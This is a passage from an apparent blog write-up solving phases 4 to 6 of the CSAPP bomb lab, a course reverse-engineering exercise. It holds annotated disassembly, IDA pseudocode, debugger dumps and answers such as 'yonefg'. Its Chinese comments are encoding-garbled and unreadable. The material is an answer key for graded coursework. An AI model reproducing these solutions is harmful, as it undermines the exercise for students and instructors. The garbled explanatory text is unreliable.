class="number">1</span>]</span><br><span class="line"><span class="number">0x0000000000400fe2</span> &lt;+<span class="number">20</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ecx</span>,<span class="built_in">edi</span></span><br><span class="line"># ç¬¬ä¸€è½®å¾ªç¯ï¼š<span class="built_in">ecx</span> = (<span class="number">0xe</span> &gt;&gt; <span class="number">0x1f</span> + <span class="number">0xe</span>) &gt;&gt; <span class="number">1</span>ï¼Œç„¶åå’Œæˆ‘ä»¬è¾“å…¥çš„ç¬¬äºŒä¸ªå‚æ•°æ¯”è¾ƒ</span><br><span class="line"><span class="number">0x0000000000400fe4</span> &lt;+<span class="number">22</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x400ff2</span> &lt;func4+<span class="number">36</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400fe6</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">edx</span>,[<span class="built_in">rcx</span>-<span class="number">0x1</span>]</span><br><span class="line"># ç¬¬ä¸‰ä¸ªå‚æ•°ï¼š[<span class="built_in">rcx</span>-<span class="number">1</span>]</span><br><span class="line"><span class="number">0x0000000000400fe9</span> &lt;+<span class="number">27</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400fce</span> &lt;func4&gt;</span><br><span class="line"><span class="number">0x0000000000400fee</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x0000000000400ff0</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401007</span> &lt;func4+<span class="number">57</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400ff2</span> &lt;+<span class="number">36</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x0000000000400ff7</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ecx</span>,<span class="built_in">edi</span></span><br><span class="line"><span class="number">0x0000000000400ff9</span> &lt;+<span class="number">43</span>&gt;:<span class="keyword">jge</span>    <span class="number">0x401007</span> &lt;func4+<span class="number">57</span>&gt;</span><br><span class="line"><span class="number">0x0000000000400ffb</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">esi</span>,[<span class="built_in">rcx</span>+<span class="number">0x1</span>]    </span><br><span class="line"><span class="number">0x0000000000400ffe</span> &lt;+<span class="number">48</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400fce</span> &lt;func4&gt;</span><br><span class="line"><span class="number">0x0000000000401003</span> &lt;+<span class="number">53</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">eax</span>,[<span class="built_in">rax</span>+<span class="built_in">rax</span>*<span class="number">1</span>+<span class="number">0x1</span>]</span><br><span class="line"><span class="number">0x0000000000401007</span> &lt;+<span class="number">57</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x000000000040100b</span> &lt;+<span class="number">61</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure></p><p>ä¸€ä¸ªé€’å½’å‡½æ•°ï¼Œæœ‰ç‚¹ç»•ã€‚ã€‚ã€‚<br>å€ŸåŠ©ä¸€ä¸‹ida - - (æˆ‘å¥½èœ<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">func4</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = (a3 - a2) / <span class="number">2</span> + a2;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * func4(a1, a2, (v3 - <span class="number">1</span>));</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; a1 )</span><br><span class="line">    result = <span class="number">2</span> * func4(a1, (v3 + <span class="number">1</span>), a3) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>å¾ˆæ¸…æ™°ï¼Œä¸èƒ½å¤§äºä¸èƒ½å°äºï¼Œå¿…é¡»ç­‰äºï¼ˆå½“ç„¶åœ¨é€’å½’ä¸­ç­‰äºä¹Ÿå¯ä»¥<br>ä»”ç»†æƒ³æƒ³ï¼Œè¿™ä¸å°±æ˜¯äºŒåˆ†æŸ¥æ‰¾å—ï¼ˆx<br>æ‰€ä»¥åªè¦èƒ½è¢«äºŒåˆ†æŸ¥æ‰¾å‘ç°çš„éƒ½å¯ä»¥</p><h2 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h2><p>æ±‡ç¼–ä»£ç å¦‚ä¸‹<br><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000401062</span> &lt;+<span class="number">0</span>&gt;:<span class="keyword">push</span>   <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x0000000000401063</span> &lt;+<span class="number">1</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">rsp</span>,<span class="number">0x20</span></span><br><span class="line"><span class="number">0x0000000000401067</span> &lt;+<span class="number">5</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">rdi</span></span><br><span class="line"><span class="number">0x000000000040106a</span> &lt;+<span class="number">8</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> <span class="built_in">fs</span>:<span class="number">0x28</span></span><br><span class="line"><span class="number">0x0000000000401073</span> &lt;+<span class="number">17</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x18</span>],<span class="built_in">rax</span></span><br><span class="line"><span class="number">0x0000000000401078</span> &lt;+<span class="number">22</span>&gt;:<span class="keyword">xor</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x000000000040107a</span> &lt;+<span class="number">24</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40131b</span> &lt;string_length&gt;</span><br><span class="line"><span class="number">0x000000000040107f</span> &lt;+<span class="number">29</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x6</span></span><br><span class="line"># æ¯”è¾ƒå­—ç¬¦ä¸²é•¿åº¦</span><br><span class="line"><span class="number">0x0000000000401082</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</span><br><span class="line"><span class="number">0x0000000000401084</span> &lt;+<span class="number">34</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x0000000000401089</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</span><br><span class="line"><span class="number">0x000000000040108b</span> &lt;+<span class="number">41</span>&gt;:<span class="keyword">movzx</span>  <span class="built_in">ecx</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>+<span class="built_in">rax</span>*<span class="number">1</span>]</span><br><span class="line"><span class="number">0x000000000040108f</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>],<span class="built_in">cl</span></span><br><span class="line"><span class="number">0x0000000000401092</span> &lt;+<span class="number">48</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>]</span><br><span class="line"><span class="number">0x0000000000401096</span> &lt;+<span class="number">52</span>&gt;:<span class="keyword">and</span>    <span class="built_in">edx</span>,<span class="number">0xf</span></span><br><span class="line"><span class="number">0x0000000000401099</span> &lt;+<span class="number">55</span>&gt;:<span class="keyword">movzx</span>  <span class="built_in">edx</span>,<span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rdx</span>+<span class="number">0x4024b0</span>]</span><br><span class="line"><span class="number">0x00000000004010a0</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rax</span>*<span class="number">1</span>+<span class="number">0x10</span>],<span class="built_in">dl</span></span><br><span class="line"><span class="number">0x00000000004010a4</span> &lt;+<span class="number">66</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rax</span>,<span class="number">0x1</span></span><br><span class="line"># æ¯æ¬¡+<span class="number">1</span></span><br><span class="line"><span class="number">0x00000000004010a8</span> &lt;+<span class="number">70</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rax</span>,<span class="number">0x6</span></span><br><span class="line"># å¾ªç¯<span class="number">6</span>æ¬¡</span><br><span class="line"><span class="number">0x00000000004010ac</span> &lt;+<span class="number">74</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010ae</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">BYTE</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x16</span>],<span class="number">0x0</span></span><br><span class="line"><span class="number">0x00000000004010b3</span> &lt;+<span class="number">81</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x40245e</span></span><br><span class="line"><span class="number">0x00000000004010b8</span> &lt;+<span class="number">86</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rdi</span>,[<span class="built_in">rsp</span>+<span class="number">0x10</span>]</span><br><span class="line"><span class="number">0x00000000004010bd</span> &lt;+<span class="number">91</span>&gt;:<span class="keyword">call</span>   <span class="number">0x401338</span> &lt;strings_not_equal&gt;</span><br><span class="line"><span class="number">0x00000000004010c2</span> &lt;+<span class="number">96</span>&gt;:<span class="keyword">test</span>   <span class="built_in">eax</span>,<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x00000000004010c4</span> &lt;+<span class="number">98</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010c6</span> &lt;+<span class="number">100</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x00000000004010cb</span> &lt;+<span class="number">105</span>&gt;:<span class="keyword">nop</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>+<span class="built_in">rax</span>*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line"><span class="number">0x00000000004010d0</span> &lt;+<span class="number">110</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010d2</span> &lt;+<span class="number">112</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x0</span></span><br><span class="line"><span class="number">0x00000000004010d7</span> &lt;+<span class="number">117</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010d9</span> &lt;+<span class="number">119</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x18</span>]</span><br><span class="line"><span class="number">0x00000000004010de</span> &lt;+<span class="number">124</span>&gt;:<span class="keyword">xor</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> <span class="built_in">fs</span>:<span class="number">0x28</span></span><br><span class="line"><span class="number">0x00000000004010e7</span> &lt;+<span class="number">133</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4010ee</span> &lt;phase_5+<span class="number">140</span>&gt;</span><br><span class="line"><span class="number">0x00000000004010e9</span> &lt;+<span class="number">135</span>&gt;:<span class="keyword">call</span>   <span class="number">0x400b30</span> &lt;__stack_chk_fail@plt&gt;</span><br><span class="line"><span class="number">0x00000000004010ee</span> &lt;+<span class="number">140</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x20</span></span><br><span class="line"><span class="number">0x00000000004010f2</span> &lt;+<span class="number">144</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x00000000004010f3</span> &lt;+<span class="number">145</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure></p><p>å¾ˆæ˜¾ç„¶æ˜¯ä¸€ä¸ªå¤§å¾ªç¯<br>åŠ¨è°ƒå‘ç°æœ‰ä¸€ä¸ªç±»ä¼¼äºä»£æ¢è¡¨çš„ä¸œè¥¿ï¼Œéœ€è¦åœ¨å¾ªç¯ä¸­ç»™å‡ºç´¢å¼•ï¼Œç„¶åæŸ¥è¡¨ï¼Œæœ€åå’Œå­—ç¬¦ä¸²å¯¹æ¯”</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/s <span class="number">0x4024B0</span></span><br><span class="line"><span class="number">0x4024b0</span> &lt;<span class="built_in">array</span>&gt;:<span class="string">&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/s <span class="number">0x40245e</span></span><br><span class="line"><span class="number">0x40245e</span>:<span class="string">&quot;flyers&quot;</span></span><br></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯å–å‰é¢çš„<code>maduiersnfotvbyl</code><br>ç´¢å¼•å€¼ä¸º[9, 15, 14, 5, 6, 7]<br>å–asciiç å€¼å’Œ0xfä¸åç­‰äºç´¢å¼•å€¼å³å¯, â€œyonefgâ€œ</p><h2 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h2><p>éƒ¨åˆ†æ±‡ç¼–ä»£ç å¦‚ä¸‹</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x0000000000401106</span> &lt;+<span class="number">18</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40145c</span> &lt;read_six_numbers&gt;</span><br><span class="line">   <span class="number">0x000000000040110b</span> &lt;+<span class="number">23</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">r14</span>,<span class="built_in">rsp</span></span><br><span class="line">   <span class="number">0x000000000040110e</span> &lt;+<span class="number">26</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">r12d</span>,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x0000000000401114</span> &lt;+<span class="number">32</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbp</span>,<span class="built_in">r13</span></span><br><span class="line">   # <span class="built_in">rsp</span> = <span class="built_in">rbp</span> éƒ½æŒ‡å‘æˆ‘ä»¬è¾“å…¥çš„<span class="number">6</span>ä¸ªæ•°å­—ï¼Œé€šè¿‡æ ˆä¼ é€’å‚æ•°ï¼Œè¿”å›å€¼å­˜å…¥<span class="built_in">rax</span></span><br><span class="line">   <span class="number">0x0000000000401117</span> &lt;+<span class="number">35</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">r13</span>+<span class="number">0x0</span>]</span><br><span class="line">   # è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—è¿›å…¥<span class="built_in">eax</span></span><br><span class="line">   <span class="number">0x000000000040111b</span> &lt;+<span class="number">39</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040111e</span> &lt;+<span class="number">42</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x0000000000401121</span> &lt;+<span class="number">45</span>&gt;:<span class="keyword">jbe</span>    <span class="number">0x401128</span> &lt;phase_6+<span class="number">52</span>&gt;</span><br><span class="line">   # -<span class="number">1</span> åå’Œ<span class="number">5</span>è¿›è¡Œæ¯”è¾ƒ, å°äºç­‰äºåˆ™è·³è½¬ï¼Œå³ç¬¬ä¸€ä½æ•°å­—å¿…é¡»å°äº<span class="number">0x5</span></span><br><span class="line">   <span class="number">0x0000000000401123</span> &lt;+<span class="number">47</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401128</span> &lt;+<span class="number">52</span>&gt;:<span class="keyword">add</span>    <span class="built_in">r12d</span>,<span class="number">0x1</span></span><br><span class="line"></span><br><span class="line">   <span class="number">0x000000000040112c</span> &lt;+<span class="number">56</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">r12d</span>,<span class="number">0x6</span></span><br><span class="line">   <span class="number">0x0000000000401130</span> &lt;+<span class="number">60</span>&gt;:<span class="keyword">je</span>     <span class="number">0x401153</span> &lt;phase_6+<span class="number">95</span>&gt;</span><br><span class="line"><span class="symbol">loop1:</span></span><br><span class="line">   # è·³å‡ºå¾ªç¯</span><br><span class="line">   <span class="number">0x0000000000401132</span> &lt;+<span class="number">62</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ebx</span>,<span class="built_in">r12d</span></span><br><span class="line">    # å¾ªç¯ä¸­çš„ç¬¬äºŒå±‚å¾ªç¯</span><br><span class="line">   <span class="number">0x0000000000401135</span> &lt;+<span class="number">65</span>&gt;:<span class="keyword">movsxd</span> <span class="built_in">rax</span>,<span class="built_in">ebx</span></span><br><span class="line">   <span class="number">0x0000000000401138</span> &lt;+<span class="number">68</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rax</span>*<span class="number">4</span>]</span><br><span class="line">        # ç´¢å¼•å–å‡ºæ•°å­—</span><br><span class="line">   <span class="number">0x000000000040113b</span> &lt;+<span class="number">71</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbp</span>+<span class="number">0x0</span>],<span class="built_in">eax</span></span><br><span class="line">        # æ¯”è¾ƒå–å‡ºçš„æ•°å­—æ˜¯å¦å’Œç¬¬ä¸€ä¸ªæ•°å­—ç›¸åŒï¼Œç›¸åŒåˆ™çˆ†ç‚¸</span><br><span class="line">   <span class="number">0x000000000040113e</span> &lt;+<span class="number">74</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401145</span> &lt;phase_6+<span class="number">81</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401140</span> &lt;+<span class="number">76</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x0000000000401145</span> &lt;+<span class="number">81</span>&gt;:<span class="keyword">add</span>    <span class="built_in">ebx</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x0000000000401148</span> &lt;+<span class="number">84</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ebx</span>,<span class="number">0x5</span></span><br><span class="line">        # <span class="built_in">ebx</span> = <span class="number">1</span>-<span class="number">6</span>ï¼Œæ¯”è¾ƒæ‰€æœ‰çš„æ•°å­—</span><br><span class="line">   <span class="number">0x000000000040114b</span> &lt;+<span class="number">87</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x401135</span> &lt;phase_6+<span class="number">65</span>&gt;</span><br><span class="line">    # è·³å‡ºç¬¬äºŒå±‚å¾ªç¯</span><br><span class="line"></span><br><span class="line">   <span class="number">0x000000000040114d</span> &lt;+<span class="number">89</span>&gt;:<span class="keyword">add</span>    <span class="built_in">r13</span>,<span class="number">0x4</span></span><br><span class="line">    # åŠ¨è°ƒå‘ç°<span class="built_in">r13</span>æŒ‡å‘ç¬¬ä¸€ä¸ªæ•°å­—ï¼Œ+<span class="number">4</span>åæŒ‡å‘ç¬¬äºŒä¸ªæ•°å­—</span><br><span class="line">   <span class="number">0x0000000000401151</span> &lt;+<span class="number">93</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401114</span> &lt;phase_6+<span class="number">32</span>&gt;</span><br><span class="line">    # å¾ªç¯ï¼Œé€€å‡ºæ¡ä»¶ä¸º<span class="built_in">r12d</span> = <span class="number">6</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">loop2:</span></span><br><span class="line">   <span class="number">0x0000000000401153</span> &lt;+<span class="number">95</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rsi</span>,[<span class="built_in">rsp</span>+<span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x0000000000401158</span> &lt;+<span class="number">100</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">r14</span></span><br><span class="line">   <span class="number">0x000000000040115b</span> &lt;+<span class="number">103</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="number">0x7</span></span><br><span class="line">   # å¾ªç¯å¼€å§‹</span><br><span class="line">   <span class="number">0x0000000000401160</span> &lt;+<span class="number">108</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="built_in">ecx</span></span><br><span class="line">   <span class="number">0x0000000000401162</span> &lt;+<span class="number">110</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">edx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line">   <span class="number">0x0000000000401164</span> &lt;+<span class="number">112</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>],<span class="built_in">edx</span></span><br><span class="line">    # æ•°å­— = <span class="built_in">edx</span>( <span class="number">0x7</span> - æ•°å­—)</span><br><span class="line">   <span class="number">0x0000000000401166</span> &lt;+<span class="number">114</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rax</span>,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x000000000040116a</span> &lt;+<span class="number">118</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rax</span>,<span class="built_in">rsi</span></span><br><span class="line">   <span class="number">0x000000000040116d</span> &lt;+<span class="number">121</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401160</span> &lt;phase_6+<span class="number">108</span>&gt;</span><br><span class="line">    # é€€å‡ºæ¡ä»¶ï¼šå½“å‰æ•°å­—ä¸º<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>loop1ä¸­ä¸»è¦æ˜¯æ¯”è¾ƒå…­ä¸ªæ•°å­—ä¸­æ˜¯å¦æœ‰ç›¸åŒçš„æ•°å­—</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x000000000040116f</span> &lt;+<span class="number">123</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">esi</span>,<span class="number">0x0</span></span><br><span class="line">   </span><br><span class="line">   <span class="number">0x0000000000401174</span> &lt;+<span class="number">128</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401197</span> &lt;phase_6+<span class="number">163</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="symbol">loop3:</span></span><br><span class="line">   <span class="number">0x0000000000401176</span> &lt;+<span class="number">130</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdx</span>+<span class="number">0x8</span>]</span><br><span class="line">   # nodeèŠ‚ç‚¹</span><br><span class="line">   <span class="number">0x000000000040117a</span> &lt;+<span class="number">134</span>&gt;:<span class="keyword">add</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x000000000040117d</span> &lt;+<span class="number">137</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">eax</span>,<span class="built_in">ecx</span></span><br><span class="line">   <span class="number">0x000000000040117f</span> &lt;+<span class="number">139</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line">   # å¾ªç¯ï¼Œä¸€ç›´åˆ°<span class="built_in">eax</span>å’Œæ•°å­—ç›¸ç­‰</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401181</span> &lt;+<span class="number">141</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401188</span> &lt;phase_6+<span class="number">148</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401183</span> &lt;+<span class="number">143</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0x6032d0</span></span><br><span class="line">   <span class="number">0x0000000000401188</span> &lt;+<span class="number">148</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rsi</span>*<span class="number">2</span>+<span class="number">0x20</span>],<span class="built_in">rdx</span></span><br><span class="line">   # å°†nodeèŠ‚ç‚¹å­˜å…¥åˆ°æ ˆç©ºé—´ä¸­</span><br><span class="line"></span><br><span class="line">   <span class="number">0x000000000040118d</span> &lt;+<span class="number">153</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsi</span>,<span class="number">0x4</span></span><br><span class="line">   <span class="number">0x0000000000401191</span> &lt;+<span class="number">157</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rsi</span>,<span class="number">0x18</span></span><br><span class="line">   # ä¸€ç›´åˆ°<span class="built_in">rsi</span>=<span class="number">0x18</span>ï¼Œå³éå†å®Œå…¨<span class="number">6</span>ä¸ªæ•°å­—</span><br><span class="line">   <span class="number">0x0000000000401195</span> &lt;+<span class="number">161</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4011ab</span> &lt;phase_6+<span class="number">183</span>&gt;</span><br><span class="line"></span><br><span class="line">   <span class="number">0x0000000000401197</span> &lt;+<span class="number">163</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ecx</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="built_in">rsi</span>*<span class="number">1</span>]</span><br><span class="line">   <span class="number">0x000000000040119a</span> &lt;+<span class="number">166</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">ecx</span>,<span class="number">0x1</span></span><br><span class="line">   # ç¬¬ä¸€ä¸ªæ•°å­—</span><br><span class="line">   <span class="number">0x000000000040119d</span> &lt;+<span class="number">169</span>&gt;:<span class="keyword">jle</span>    <span class="number">0x401183</span> &lt;phase_6+<span class="number">143</span>&gt;</span><br><span class="line">   # å¦‚æœå°äºç­‰äºåˆ™å‘ä¸Šè·³</span><br><span class="line">   <span class="number">0x000000000040119f</span> &lt;+<span class="number">171</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004011a4</span> &lt;+<span class="number">176</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">edx</span>,<span class="number">0x6032d0</span> </span><br><span class="line">   # <span class="number">0x6032d0</span> -&gt; <span class="number">0x000000010000014c</span></span><br><span class="line">   <span class="number">0x00000000004011a9</span> &lt;+<span class="number">181</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x401176</span> &lt;phase_6+<span class="number">130</span>&gt;</span><br><span class="line">    # å‘ä¸Šè·³</span><br></pre></td></tr></table></figure><p>è¿™ä¸€éƒ¨åˆ†ä¹Ÿè¯¦ç»†å†™å…¥æ³¨é‡Šä¸­<br>ç»è¿‡åŠ¨è°ƒå‘ç°å®ç°äº†å°†è¾“å…¥çš„æ•°å­—å‡å»7ï¼Œå¹¶ä¸”å°†å¯¹åº”çš„nodeèŠ‚ç‚¹éƒ½ç§»åŠ¨åˆ°æ ˆä¸­</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">0x00000000004011ab</span> &lt;+<span class="number">183</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rsp</span>+<span class="number">0x20</span>]</span><br><span class="line"><span class="number">0x00000000004011b0</span> &lt;+<span class="number">188</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rax</span>,[<span class="built_in">rsp</span>+<span class="number">0x28</span>]</span><br><span class="line"><span class="number">0x00000000004011b5</span> &lt;+<span class="number">193</span>&gt;:<span class="keyword">lea</span>    <span class="built_in">rsi</span>,[<span class="built_in">rsp</span>+<span class="number">0x50</span>]</span><br><span class="line"><span class="number">0x00000000004011ba</span> &lt;+<span class="number">198</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rcx</span>,<span class="built_in">rbx</span></span><br><span class="line"># start</span><br><span class="line"><span class="number">0x00000000004011bd</span> &lt;+<span class="number">201</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rdx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">0x00000000004011c0</span> &lt;+<span class="number">204</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span 